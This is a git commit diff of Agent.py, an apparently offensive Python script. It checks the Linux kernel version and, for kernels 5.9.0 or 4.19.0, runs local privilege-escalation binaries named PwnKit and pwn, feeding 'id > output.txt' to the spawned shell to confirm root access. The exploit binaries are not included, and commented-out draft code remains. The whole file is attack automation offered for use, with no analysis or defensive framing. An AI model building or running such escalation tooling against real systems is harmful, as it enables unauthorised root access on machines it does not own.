79cf56ae9fff23b10be559eeea62dc9a90a47727
Mohammad Hassan Turi <87395528+hassan-turi@users.noreply.github.com>
2022-02-11 22:02:42 +0500

    Add files via upload
    Modified

--- Agent.py
+++ Agent.py
@@ -1,22 +1,48 @@
 import subprocess
 import os
+import re
 import sys
 from pathlib import Path
-import pexpect
 
-
+# class Agent():
+  
 Linux_kernel = ['4.19.13', '4.19.0', '4.19.28', '5.4.0', '5.5.0', '5.7.0', '5.9.0']
 
-kernel_name = subprocess.Popen(['uname','-r'])
-kernel_name = str(kernel_name)
-if kernel_name in Linux_kernel:
-    if kernel_name == '5.9.0':
-        args = ["./PwnKit"]
-        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-        child_process_output = child_proccess.communicate(b"id > output.txt")[0]
-        print(child_process_output)
-    if kernel_name == '4.19.0':
-        args = ["./pwn"]
-        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-        child_process_output = child_proccess.communicate(b"id > output.txt")[0]
-        print(child_process_output)
+
+p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
+kernel_name = p.decode('utf-8')
+print(type(kernel_name))
+# kernel_name1 , err = p.communicate()
+
+kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+",kernel_name))
+
+if kernel_name1 == "5.9.0":
+    print("hello")
+    args = ["./PwnKit"]
+    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    child_process_output = child_proccess.communicate(b"id > output.txt")[0]
+    print(child_process_output)
+
+elif kernel_name1 == "4.19.0":
+    args = ["./pwn"]
+    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    child_process_output = child_proccess.communicate(b"id > output.txt")[0]
+    print(child_process_output)
+
+    # def linux(self):
+    #     print('there')
+    #     if '5.9.0'.__contains__(self.kernel_name):
+    #         print("hello")
+    #         args = ["./PwnKit"]
+    #         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    #         child_process_output = child_proccess.communicate(b"id > output.txt")[0]
+    #         print(child_process_output)
+    # if kernel_name == '4.19.0':
+    #     args = ["./pwn"]
+    #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    #     child_process_output = child_proccess.communicate(b"id > output.txt")[0]
+    #     print(child_process_output)
+    
+# obj = Agent()
+# obj.check()
+# obj.linux()
